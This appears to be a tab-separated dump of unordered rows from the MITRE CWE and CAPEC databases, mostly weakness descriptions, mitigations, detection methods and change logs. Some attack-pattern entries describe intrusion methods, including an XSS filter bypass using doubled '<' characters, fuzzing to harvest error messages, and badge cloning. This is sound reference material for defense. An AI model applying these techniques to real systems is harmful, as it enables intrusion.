20897	23	Two distinct privileges, roles, capabilities, or rights can be combined in a way that allows an entity to perform unsafe actions that would not be allowed without that combination.
22565	35	MITRE
14999	42	Identify the functionality that requires additional privileges, such as access to privileged operating system resources. Wrap and centralize this functionality if possible, and isolate the privileged code as much as possible from other code [REF-76]. Raise privileges as late as possible, and drop them as soon as possible to avoid CWE-271. Avoid weaknesses such as CWE-288 and CWE-420 by protecting all possible communication channels that could interact with the privileged code, such as a secondary socket that is only intended to be accessed by administrators.
11442	39	2008-07-01
8094	77	Automated Static Analysis - Source Code
7040	31	699
14927	26	Implementation
22014	61	Stable
21440	70	Wikipedia
19237	54	Low
15681	45	Variant
15745	85	523
13822	35	MITRE
16716	42	If available, use the signing/sealing features of the programming language to assure that deserialized data has not been tainted. For example, a hash-based message authentication code (HMAC) could be used to ensure that data has not been modified.
22062	39	2019-01-03
23579	66	Top 10 2007-Insecure Communications
11661	35	Cigital
12416	62	updated Description
11961	31	1000
23655	61	Draft
12912	35	MITRE
9401	55	CAPEC Content Team
16053	69	Incomplete
18994	39	2008-09-08
16173	53	The MITRE Corporation
11937	100	The MITRE Corporation
12678	62	updated Modes_of_Introduction, Relationships
10099	39	2014-07-30
11240	28	CWE Content Team
23684	39	2009-03-10
22070	35	MITRE
12768	39	2017-11-08
20964	53	The MITRE Corporation
7846	85	621
13817	23	The software properly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.
12979	28	CWE Content Team
12550	35	MITRE
22763	91	Architecture and Design
21239	59	Updated Attacker_Skills_or_Knowledge_Required
20820	23	Windows systems have hidden network shares that are only accessible to administrators and allow files to be written to the local computer. Example network shares include: C$, ADMIN$ and IPC$. Adversaries may use valid administrator credentials to remotely access a network share to transfer files and execute code. It is possible for adversaries to use NTLM hashes to access administrator shares on systems with certain configuration and patch levels.
25387	50	Design: Use browser technologies that do not allow client side scripting.
14652	62	updated Relationships, Type
5890	76	2019-04-04
12034	62	updated Relationships
10320	28	CWE Content Team
6107	56	ChildOf
15162	77	Automated Static Analysis
25387	89	Detailed
25138	55	CAPEC Content Team
19380	62	updated Description, Other_Notes
17538	76	2015-12-07
7183	28	CWE Content Team
19500	39	2008-09-08
19556	39	2011-06-01
8858	49	2013
20780	74	2
18562	62	updated Common_Consequences
7295	23	A product adds hooks to user-accessible API functions, but does not properly validate the arguments. This could lead to resultant vulnerabilities.
23711	28	CWE Content Team
17602	33	Mark Dowd
24447	45	Base
6233	62	updated Relationships, Taxonomy_Mappings
17755	28	CWE Content Team
10097	31	1000
23901	62	updated Common_Consequences
14253	26	Implementation
7771	103	Primary
6068	28	CWE Content Team
19968	69	Incomplete
23868	62	Suggested OWASP Top Ten 2004 mapping
13662	28	CWE Content Team
22452	91	Implementation
12284	62	updated Common_Consequences
13693	62	updated Common_Consequences
9404	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction
21619	80	Predicting Session ID may require more computation work which uses advanced analysis such as statistical analysis.
22225	35	MITRE
25401	28	CWE Content Team
24003	28	CWE Content Team
18033	101	CAPEC Content Team
10460	39	2018-03-27
12120	97	Overflow Buffers
18774	78	Low
6200	35	MITRE
15052	89	Detailed
6593	31	1000
22211	56	ChildOf
24224	103	Primary
11785	35	MITRE
20652	42	Increase the entropy used to seed a PRNG.
7615	47	Hide Activities
24767	21	PLOVER
20190	39	2008-07-01
14288	104	107
18028	72	The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.
6625	39	2009-03-10
22547	31	699
11446	53	The MITRE Corporation
13134	78	Low
7644	39	2017-11-08
6068	35	MITRE
5936	40	This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.
12481	62	updated References
14001	39	2009-10-29
15740	31	1000
15597	35	MITRE
21540	40	An application that fail to adequately sanitize or encode untrusted input.
22020	28	CWE Content Team
16386	63	Read Application Data
12522	35	MITRE
7483	31	1000
7155	55	CAPEC Content Team
24714	63	Unexpected State
11254	24	MITRE
14375	63	Bypass Protection Mechanism
24057	28	CWE Content Team
12670	69	Incomplete
7787	62	updated Potential_Mitigations
22575	31	1000
17802	35	MITRE
21213	45	Base
19524	39	2011-03-29
11277	21	Anonymous Tool Vendor (under NDA)
9196	56	PeerOf
15343	35	MITRE
23423	59	Updated Related_Vulnerabilities
6756	35	MITRE
7961	35	MITRE
15039	39	2019-06-20
19361	62	updated Description
15680	39	2012-05-11
10316	53	The MITRE Corporation
12078	62	updated Relationships
24264	28	CWE Content Team
20216	39	2010-06-21
12070	102	CanPrecede
21015	39	2009-01-12
13129	63	DoS: Crash, Exit, or Restart
25128	69	Draft
22885	31	1000
15225	35	MITRE
22334	61	Draft
15913	81	Integrity
18406	103	Primary
8142	39	2009-03-10
14143	31	699
15984	21	PLOVER
16771	69	Incomplete
22744	50	Ensure that your password recovery functionality is not vulnerable to an injection style attack.
13158	62	updated Demonstrative_Examples
19350	28	CWE Content Team
18569	28	CWE Content Team
9150	59	Updated Related_Weaknesses
16085	103	Primary
22947	28	CWE Content Team
17353	91	Architecture and Design
8385	35	MITRE
22786	104	414
17987	35	MITRE
16781	49	2002
19791	39	2011-09-13
21262	81	Other
13444	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)
14935	71	2008
14990	90	Java
19644	31	699
21275	39	2019-01-03
17218	43	Simple
17629	56	PeerOf
15533	95	[Modify the parameters to get the desired information from the error messages.] Attacker usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the attacker may try changing the origin IP addresses or client browser identification strings or start a new session from where he left off in obfuscating the attack.
9056	26	Operation
21139	88	Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
17141	35	MITRE
14184	31	1003
15727	94	Run Arbitrary Code
8233	79	Confidentiality
10519	28	CWE Content Team
12530	35	MITRE
12642	81	Availability
13193	45	Base
11358	35	MITRE
15353	42	Error check the return values of all functions. Be aware of implicit casts made, and use unsigned variables for sizes if at all possible.
17681	53	The MITRE Corporation
19686	91	Operation
16183	26	Implementation
15283	50	Design: Use browser technologies that do not allow client side scripting.
12258	39	2010-09-27
17612	35	MITRE
19923	50	Test your path decoding process against malicious input.
18616	72	Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.
12021	91	Implementation
23003	72	Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent.
13056	39	2011-06-01
23512	47	Unreliable Execution
9864	28	CWE Content Team
9526	62	updated Applicable_Platforms, Demonstrative_Examples, Relationships, Taxonomy_Mappings
6973	43	Simple
6984	40	The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.
17478	26	Architecture and Design
12132	39	2011-06-01
7374	39	2011-03-29
13707	56	PeerOf
11555	35	MITRE
6820	62	updated Common_Consequences, Other_Notes
21815	39	2008-09-08
14201	100	The MITRE Corporation
19742	77	Dynamic Analysis with Automated Results Interpretation
7131	35	MITRE
14239	97	Reverse Engineer an Executable to Expose Assumed Hidden Functionality
18537	28	CWE Content Team
7974	28	CWE Content Team
20702	39	2017-11-08
18158	66	Intriguing properties of neural networks
25156	62	updated Common_Consequences
13180	28	Eric Dalci
20584	39	2010-12-13
22220	35	MITRE
7466	80	Only basic skills are required to determine and fixate session identifiers in a user's browser. Subsequent attacks may require greater skill levels depending on the attackers' motives.
22314	26	Implementation
12361	31	1000
14897	62	updated Relationships, Type
8211	46	Most languages and protocols have their own special elements such as characters and reserved words. These special elements can carry control implications. If software does not prevent external control or influence over the inclusion of such special elements, the control flow of the program may be altered from what was intended. For example, both Unix and Windows interpret the symbol < ("less than") as meaning "read input from a file".
23906	104	644
20166	26	Implementation
12162	28	CWE Content Team
10717	35	MITRE
17333	62	updated Common_Consequences
10644	63	Unexpected State
22818	62	updated Description, Other_Notes, Theoretical_Notes
9321	62	updated Related_Attack_Patterns
9952	35	MITRE
7589	28	Eric Dalci
15633	24	MITRE
11556	28	CWE Content Team
23355	62	updated Observed_Examples
12002	39	2009-07-27
12496	62	updated Potential_Mitigations
7292	91	Implementation
21617	39	2014-07-30
18122	39	2012-05-11
10563	62	updated Applicable_Platforms
14261	35	MITRE
14336	91	Architecture and Design
16356	31	1000
21757	62	updated Common_Consequences
7504	35	MITRE
19465	35	MITRE
9521	59	Updated References, Related_Attack_Patterns
7800	59	Updated Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations
17957	100	The MITRE Corporation
7706	100	The MITRE Corporation
12860	35	MITRE
15615	104	607
23194	91	Architecture and Design
16364	39	2018-03-27
8634	28	CWE Content Team
17411	33	Roberto Paleari
22513	28	CWE Content Team
12610	55	CAPEC Content Team
10395	59	Updated Related_Attack_Patterns
16303	42	For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.
19822	31	1000
13242	35	MITRE
6061	91	Architecture and Design
14707	28	CWE Content Team
23335	26	Architecture and Design
21156	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
13574	25	High
20308	28	CWE Content Team
17002	39	2014-07-30
13190	28	CWE Content Team
17445	56	ChildOf
14923	72	The cryptographic key in question may be compromised, providing a malicious user with a method for authenticating as the victim.
23359	62	updated Relationships, Taxonomy_Mappings
16856	55	CAPEC Content Team
8133	76	2018-07-31
22586	35	MITRE
22834	62	updated Description, Other_Notes
10185	62	updated Relationships
14470	66	Samy (computer worm)
19116	100	The MITRE Corporation
7671	39	2012-05-11
19900	28	CWE Content Team
21100	62	updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, References, Relationships
13202	28	CWE Content Team
20483	35	MITRE
16291	28	CWE Content Team
11684	81	Confidentiality
6404	28	CWE Content Team
18756	69	Draft
16225	23	The software receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.
14643	23	An attacker exploits security assumptions to bypass electronic locks or other forms of access controls. Most attacks against electronic access controls follow similar methods but utilize different tools. Some electronic locks utilize magnetic strip cards, others employ RFID tags embedded within a card or badge, or may involve more sophisticated protections such as voice-print, thumb-print, or retinal biometrics. Magnetic Strip and RFID technologies are the most widespread because they are cost effective to deploy and more easily integrated with other electronic security measures. These technologies share common weaknesses that an attacker can exploit to gain access to a facility protected by the mechanisms via copying legitimate cards or badges, or generating new cards using reverse-engineered algorithms.
21970	56	ChildOf
19683	62	updated Common_Consequences, References, Relationships
20037	39	2014-07-30
13073	57	Resultant
8640	39	2008-10-14
6927	62	updated Common_Consequences
20842	40	Session IDs are used to control access to resources.
5753	36	http://www.ibm.com/developerworks/xml/library/x-tipcfsx.html
8166	101	CAPEC Content Team
24193	91	Architecture and Design
25123	61	Draft
24113	23	An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.
15022	53	The MITRE Corporation
8405	39	2008-07-01
8093	28	CWE Content Team
8974	28	CWE Content Team
8723	35	MITRE
9167	39	2014-07-30
17455	28	CWE Content Team
9200	23	An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.
10442	39	2012-10-30
7019	21	CLASP
22749	31	699
22168	47	Other
16397	35	MITRE
15107	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
10127	35	MITRE
24196	96	2018-07-29
15699	23	The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.
8893	104	774
15227	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
13483	62	updated Demonstrative_Examples
14767	35	MITRE
22924	35	MITRE
19585	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.
13117	35	MITRE
8344	25	High
12736	31	1000
13325	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
24264	35	MITRE
7978	104	396
16676	26	Architecture and Design
24452	28	CWE Content Team
9939	39	2008-07-01
9129	39	2012-05-11
11875	39	2012-05-11
15177	28	CWE Content Team
10819	39	2009-05-27
18155	31	1000
24679	35	MITRE
13794	39	2008-08-15
10751	103	Primary
16115	28	CWE Content Team
20577	77	Automated Static Analysis - Source Code
23086	103	Primary
24376	35	MITRE
8967	26	Implementation
9849	24	MITRE
17786	24	MITRE
25196	45	Class
24230	39	2015-12-07
8901	62	updated Common_Consequences
19945	28	CWE Content Team
13177	39	2009-07-17
11129	39	2012-05-11
15756	42	Use OS-level preventative functionality. This is not a complete solution.
14304	62	updated Description, Potential_Mitigations
9411	63	Read Files or Directories
20610	59	Updated Attack_Phases, Related_Attack_Patterns
19600	62	updated Relationships
15242	56	ChildOf
23417	103	Primary
17538	59	Updated Related_Attack_Patterns
8591	62	updated Time_of_Introduction
17536	62	updated Demonstrative_Examples
21221	73	Modify tokens bitwise
13366	62	updated Time_of_Introduction
15241	91	Build and Compilation
6867	39	2014-07-30
19669	62	updated Demonstrative_Examples, Potential_Mitigations
18782	22	03
19541	53	The MITRE Corporation
14037	62	updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Relationships
11684	63	Execute Unauthorized Code or Commands
24935	43	Simple
13566	91	System Configuration
24478	62	updated Relationships, Taxonomy_Mappings
22897	62	updated Potential_Mitigations
18443	39	2011-06-01
25326	28	CWE Content Team
7306	46	Frequently the consequence is a "flood" of connection or sessions.
15129	62	updated Relationships
17713	66	Best Practices for ASP.NET MVC
15911	39	2009-05-27
11182	38	If the first decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.
8420	79	Authorization
12547	39	2011-06-01
14216	21	Anonymous Tool Vendor (under NDA)
24435	50	Configuration: Disable client side DNS caching.
5590	92	Exploit
9513	62	updated Relationships, Taxonomy_Mappings
23501	81	Confidentiality
17938	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
20702	28	CWE Content Team
18323	103	Primary
16167	35	MITRE
5623	39	2012-05-11
6065	73	Analyze the cookie's contents to determine whether it contains any sensitive information.
25163	35	MITRE
8874	39	2019-01-03
13895	62	updated Relationships
22084	43	Simple
21061	74	1
18354	39	2009-03-10
11308	63	DoS: Crash, Exit, or Restart
25270	39	2018-03-27
17035	35	MITRE
22386	35	Cigital
14251	88	Improper Access Control
16067	62	updated Common_Consequences, Other_Notes
7678	31	1003
19054	28	CWE Content Team
7591	35	MITRE
7623	101	CAPEC Content Team
10040	62	updated Common_Consequences
24975	81	Integrity
15835	39	2017-11-08
21532	39	2011-06-01
6672	62	updated Other_Notes, Relationship_Notes
5981	92	Explore
11404	39	2012-10-30
10955	79	Authorization
18168	79	Access Control
10753	67	Medium
12303	39	2010-04-05
15614	28	CWE Content Team
17457	104	667
17615	62	updated Taxonomy_Mappings
16594	26	Architecture and Design
9328	31	1000
11645	50	Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(') or operators such as or (|), and (&) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered, it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.
16652	62	updated Potential_Mitigations
7724	62	updated Potential_Mitigations
18702	28	CWE Content Team
14193	103	Primary
16024	35	MITRE
13779	39	2019-09-19
6157	51	2014-06-23
6950	46	Certain functions behave in dangerous ways regardless of how they are used. Functions in this category were often implemented without taking security concerns into account. The gets() function is unsafe because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to gets() and overflow the destination buffer. Similarly, the >> operator is unsafe to use when reading into a statically-allocated character array because it does not perform bounds checking on the size of its input. An attacker can easily send arbitrarily-sized input to the >> operator and overflow the destination buffer.
16593	35	MITRE
8291	81	Access Control
17526	35	Cigital
21090	28	CWE Content Team
16606	35	MITRE
12936	85	151
14745	104	159
14391	28	CWE Content Team
12764	39	2011-06-01
9976	31	1000
22161	50	Purchase potential TypoSquatted domains and forward to legitimate domain.
24779	28	CWE Content Team
18844	28	CWE Content Team
20716	100	The MITRE Corporation
9920	102	ChildOf
12643	35	MITRE
14677	104	158
9931	53	The MITRE Corporation
14158	56	ChildOf
14735	62	updated Common_Consequences
22086	102	ChildOf
11497	56	ChildOf
7697	104	290
18489	39	2017-11-08
17615	28	CWE Content Team
9389	81	Confidentiality
20874	81	Confidentiality
22276	81	Confidentiality
14817	28	CWE Content Team
14915	56	ChildOf
23793	104	915
10456	39	2012-05-11
10984	28	CWE Content Team
23698	35	MITRE
19524	28	CWE Content Team
14759	56	ChildOf
5861	89	Detailed
24866	32	Adallom, Inc.
12488	62	updated References, Relationships
18358	26	Implementation
10978	62	updated Taxonomy_Mappings
15401	53	The MITRE Corporation
15195	31	1000
9123	35	Cigital
18663	76	2017-08-04
9928	62	updated Relationships
12396	44	SOAR Partial
23006	39	2008-09-08
18327	35	MITRE
10809	52	Automated dynamic analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc.                   However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated dynamic analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.                   When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated dynamic analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.
23029	23	If too few arguments are sent to a function, the function will still pop the expected number of arguments from the stack. Potentially, a variable number of arguments could be exhausted in a function as well.
14279	28	CWE Content Team
18508	74	2
7766	39	2013-07-17
11348	50	Use an abstraction library to abstract away risky APIs. Not a complete solution.
13507	40	Targeted software is utilizing application framework APIs
9285	28	CWE Content Team
14607	39	2010-06-21
13555	76	2017-08-04
5762	81	Confidentiality
16083	76	2018-07-31
20680	59	Updated Related_Attack_Patterns
22502	31	1000
16419	28	CWE Content Team
17922	39	2019-06-20
13721	39	2017-11-08
20337	35	MITRE
11712	59	Updated Attack_Phases
12585	31	699
23647	35	MITRE
9186	31	699
7361	92	Explore
11466	85	406
6571	28	CWE Content Team
17383	97	Route Disabling
12135	31	1000
19640	25	Low
24868	56	ChildOf
22812	79	Availability
25205	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
6254	51	2014-06-23
9192	35	MITRE
11249	63	Modify Memory
7855	76	2019-04-04
21455	28	CWE Content Team
7012	35	MITRE
16141	103	Primary
12975	62	updated Common_Consequences
14823	46	Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.
12471	35	MITRE
24735	90	Language-Independent
22926	28	CWE Content Team
9671	23	The program contains code that is not essential for execution,       i.e. makes no state changes and has no side effects that alter       data or control flow, such that removal of the code would have no impact       to functionality or correctness.
25005	104	6
19690	35	MITRE
10788	28	CWE Content Team
17984	86	http://www.securiteam.com/securitynews/6D0100A5PU.html
18995	26	Architecture and Design
11474	28	CWE Content Team
22191	63	Modify Application Data
16454	62	updated Potential_Mitigations
23526	39	2010-04-05
18975	62	updated Common_Consequences
8385	28	CWE Content Team
6027	39	2019-01-03
24436	92	Experiment
5842	89	Detailed
24707	79	Integrity
18167	66	Top 25 Series - Rank 5 - Improper Access Control (Authorization)
24099	62	updated Related_Attack_Patterns, Relationships
8362	39	2011-03-29
5953	80	The adversary needs to have a solid understanding of the HTTP protocol and HTTP headers and must be able to craft and inject requests to elicit the split responses.
17069	47	Modify Data
17895	39	2017-11-08
7430	55	CAPEC Content Team
14605	96	2009-07-15
24625	35	MITRE
10173	90	Language-Independent
11637	26	Implementation
15472	28	CWE Content Team
16277	39	2012-05-11
22693	31	699
5605	103	Primary
25273	57	Indirect
24531	28	Eric Dalci
18602	94	Run Arbitrary Code
18153	74	2
18429	90	Language-Independent
16408	56	ChildOf
11484	91	Implementation
13684	35	MITRE
19034	28	CWE Content Team
7449	49	2000
17095	72	There is the potential for arbitrary code execution with privileges of the vulnerable program via a "write, what where" primitive. If pointers to memory which hold user information are freed, a malicious user will be able to write 4 bytes anywhere in memory.
7231	43	Simple
25287	62	updated Related_Attack_Patterns, Relationships
23201	61	Draft
25332	28	CWE Content Team
24113	50	If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.
17480	39	2010-04-05
18196	35	MITRE
20139	35	MITRE
21365	35	MITRE
7664	54	Medium
6307	35	MITRE
20144	103	Primary
21807	30	David Richardson
7645	26	Architecture and Design
22666	39	2008-07-01
17783	39	2014-07-30
12897	40	The adversary requires access to a DNS server that will return the MX records for a network.
16822	61	Draft
7127	102	CanFollow
17120	21	PLOVER
16696	62	updated Relationships, Taxonomy_Mappings
21858	71	2011
8291	81	Other
22866	91	Implementation
12312	62	updated Potential_Mitigations, Time_of_Introduction
16408	103	Primary
13682	39	2017-11-08
16299	100	The MITRE Corporation
23218	62	updated Relationships
9131	35	MITRE
18519	28	CWE Content Team
8283	72	Format string problems allow for information disclosure which can severely simplify exploitation of the program.
8340	54	Low
20609	45	Variant
6840	39	2011-09-13
16182	102	ChildOf
25433	72	The object could potentially allow the object to be read.
24200	35	MITRE
11436	59	Updated Related_Attack_Patterns
22711	28	CWE Content Team
17292	45	Base
18657	35	MITRE
6006	35	Cigital
11064	39	2009-07-27
9270	21	CWE Content Team
16546	35	MITRE
6670	35	MITRE
17968	62	updated Common_Consequences
9312	56	ChildOf
6567	39	2013-02-21
6054	35	MITRE
23754	39	2014-07-30
21394	39	2012-05-11
17156	28	CWE Content Team
6677	55	CAPEC Content Team
16718	28	CWE Content Team
21338	31	1000
17932	91	Implementation
14146	45	Base
20225	26	Operation
17126	39	2009-07-27
6627	101	CAPEC Content Team
20154	39	2011-06-01
15384	76	2018-07-31
20756	56	ChildOf
6089	26	Implementation
9514	28	CWE Content Team
7166	28	CWE Content Team
25377	24	MITRE
19092	101	CAPEC Content Team
16251	23	An attacker with access to a manufacturer's documentation containing requirements allocation and software design processes maliciously alters the documentation in order to cause errors in system design. This allows the attacker to take advantage of a weakness in a deployed system of the manufacturer for malicious purposes.
11696	39	2012-05-11
15749	91	Architecture and Design
9491	39	2012-05-11
16766	46	While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required.
8409	24	MITRE
11473	28	CWE Content Team
21919	35	MITRE
9758	28	CWE Content Team
10467	103	Primary
9297	90	C++
15323	31	1000
11280	47	Other
24254	79	Availability
11239	62	updated Common_Consequences
25108	90	Java
20648	28	CWE Content Team
16108	76	2018-07-31
18682	35	MITRE
19071	61	Draft
14018	62	updated References, Demonstrative_Example, Potential_Mitigations, Time_of_Introduction
9425	62	updated Relationships
17274	39	2015-12-07
8014	28	CWE Content Team
21900	35	MITRE
14585	39	2009-07-27
19812	39	2008-07-01
10934	46	Cryptographic implementations should follow the algorithms that define them exactly, otherwise encryption can be weaker than expected.
13604	100	The MITRE Corporation
24641	49	2003
6090	57	Primary
18014	35	MITRE
18960	44	High
23183	90	Language-Independent
7664	97	Jamming
9095	104	288
7371	59	Updated Typical_Likelihood_of_Exploit
13456	74	2
7650	59	Updated @Abstraction
19237	40	The adversary must have gained access to the target system via physical or logical means in order to carry out this attack.
21470	35	MITRE
14963	39	2011-03-29
25317	100	The MITRE Corporation
22737	27	Either mobile phone or access to a web resource that allows text messages to be sent to mobile phones. Resources needed for regular Phishing attack.
7339	48	05
9107	77	Manual Analysis
5887	39	2017-05-03
21645	56	ChildOf
20618	23	This attack targets user controlled variables (DEBUG=1, PHP Globals, and So Forth). An attacker can override environment variables leveraging user-supplied, untrusted query variables directly used on the application server without any data sanitization. In extreme cases, the attacker can change variables controlling the business logic of the application. For instance, in languages like PHP, a number of poorly set default configurations may allow the user to override variables.
11362	101	CAPEC Content Team
8341	35	MITRE
24957	88	Struts: Form Field Without Validator
24442	91	Implementation
20307	102	ChildOf
24196	24	MITRE
9168	28	Sean Eidemiller
6471	23	This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.
19135	62	updated Common_Consequences, Observed_Examples, Relationships
19672	31	1000
20684	35	MITRE
6439	35	MITRE
12398	43	Simple
20751	79	Confidentiality
19756	35	MITRE
9169	39	2012-05-11
15103	26	Implementation
8561	31	699
17702	45	Class
19751	39	2008-07-01
20411	97	Fault Injection
19583	33	Michael Howard
24291	56	ChildOf
6590	62	updated Potential_Mitigations
6399	94	Capture vibrations/emissions from the handset or retransmission device display screen to recreat display information from a distance.
6067	35	MITRE
6104	62	updated Other_Notes, Weakness_Ordinalities
7002	35	Cigital
14340	59	Updated Consequences, Related_Attack_Patterns
17991	81	Integrity
12573	26	Architecture and Design
20114	31	1000
13646	68	This is only a partial solution since it will not prevent your code from being modified on the hosting site or in transit.
24724	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
13244	79	Authorization
22039	79	Confidentiality
8320	28	CWE Content Team
12217	81	Integrity
6492	62	updated Related_Attack_Patterns
15598	39	2008-07-01
12050	77	Manual Dynamic Analysis
10055	39	2017-11-08
24199	39	2012-10-30
11185	39	2008-07-01
18097	35	MITRE
25067	104	511
15976	28	CWE Content Team
24530	31	699
23801	24	MITRE
17814	35	MITRE
23122	28	CWE Content Team
15876	35	MITRE
22112	50	Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD, normalize, filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.
8957	35	MITRE
15879	35	MITRE
23220	40	Cellular devices that allow negotiating security modes to facilitate backwards compatibility and roaming on legacy networks.
5703	89	Detailed
16542	56	ChildOf
6837	35	MITRE
23639	33	Steven Christey
13550	50	Implementation: Implement message level security such as HMAC in the HTTP communication
20842	78	High
16940	62	updated Relationships
18559	23	The software, when opening a file or directory, does not sufficiently account for when the file is a symbolic link that resolves to a target outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.
19314	44	High
16425	100	The MITRE Corporation
18717	81	Other
14866	101	CAPEC Content Team
15495	39	2010-06-21
6108	56	ChildOf
23848	103	Primary
23376	93	High
23760	28	CWE Content Team
20056	102	ChildOf
19658	101	CAPEC Content Team
11601	100	The MITRE Corporation
11339	62	updated Enabling_Factors_for_Exploitation, Other_Notes
14238	35	MITRE
19476	35	MITRE
18683	48	12
7736	62	updated Potential_Mitigations
17410	62	updated References, Relationships
23356	35	MITRE
16106	35	MITRE
14389	48	04
23984	39	2008-09-08
20278	92	Exploit
5702	62	updated Related_Attack_Patterns
7961	28	CWE Content Team
22403	97	Escaping a Sandbox by Calling Signed Code in Another Language
24180	50	Look for overlong UTF-8 sequences starting with malicious pattern. You can also use a UTF-8 decoder stress test to test your UTF-8 parser (See Markus Kuhn's UTF-8 and Unicode FAQ in reference section)
7024	39	2011-06-01
9883	35	MITRE
14739	81	Confidentiality
15019	35	MITRE
25011	100	The MITRE Corporation
13925	56	ChildOf
8953	103	Primary
9672	72	An attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.
14834	28	CWE Content Team
9362	36	https://www.fbi.gov/contact-us/field-offices/newyork/news/press-releases/dozens-of-online-dark-markets-seized-pursuant-to-forfeiture-complaint-filed-in-manhattan-federal-court-in-conjunction-with-the-arrest-of-the-operator-of-silk-road-2.0
21810	81	Integrity
22052	39	2008-11-24
16052	62	updated Relationships, Taxonomy_Mappings
